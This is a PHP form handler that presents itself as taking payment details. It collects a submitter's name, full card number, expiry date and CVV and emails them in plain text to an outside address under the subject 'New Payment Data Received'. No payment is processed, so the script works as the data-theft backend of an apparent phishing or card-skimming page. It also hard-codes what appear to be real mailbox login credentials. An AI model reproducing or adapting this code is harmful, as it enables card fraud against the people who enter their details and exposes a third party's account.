<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

// Get data from the form
$firstName = $_POST['firstName'];
$lastName = $_POST['lastName'];
$cardNumber = $_POST['cardNumber'];
$exp = $_POST['exp'];
$cvv = $_POST['cvv'];

// Create a PHPMailer object
$mail = new PHPMailer(true);

try {
    // Server settings (replace with your SMTP server details)
    $mail->isSMTP();
    $mail->Host = 'smtp.example.com'; // Your SMTP server hostname
    $mail->SMTPAuth = true;
    $mail->Username = 'remensnyderlinda@gmail.com'; // Your SMTP server username
    $mail->Password = 'G@m1ngPC'; // Your SMTP server password
    $mail->SMTPSecure = '465'; // TLS or SSL, depending on your SMTP server configuration
    $mail->Port = 587; // TCP port to connect to

    // Sender and recipient settings
    $mail->setFrom('remensnyderlinda@gmail.com', 'Linda'); // Sender email and name
    $mail->addAddress('saif@torid.live', 'SK'); // Recipient email and name

    // Email content
    $mail->isHTML(true);
    $mail->Subject = 'New Payment Data Received';
    $mail->Body = "First Name: $firstName<br>Last Name: $lastName<br>Card Number: $cardNumber<br>Expiration: $exp<br>CVV: $cvv";

    // Send email
    $mail->send();
    echo 'Email sent successfully';
} catch (Exception $e) {
    echo 'Email could not be sent. Mailer Error: ' . $mail->ErrorInfo;
}
?>
